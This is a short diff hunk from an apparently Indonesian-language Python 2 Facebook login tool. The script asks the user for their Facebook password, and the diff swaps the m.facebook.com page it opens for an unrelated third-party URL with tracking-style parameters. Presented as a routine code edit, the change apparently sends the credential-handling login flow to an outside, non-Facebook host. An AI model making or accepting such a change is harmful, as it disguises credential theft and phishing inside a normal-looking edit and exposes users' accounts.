@@ -70,7 +70,7 @@ def login():
         pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword FB \x1b[1;91m:\x1b[1;92m ')
         tik()
         try:
-            br.open('https://m.facebook.com')
+            br.open('http://www.simplysit.com/15690//S3Rtg/?sc=1&sc=1&l=1&ppy=5772259&i=5772259')
         except mechanize.URLError:
             print '\n\x1b[1;91m[!] Tidak ada koneksi'
             keluar()
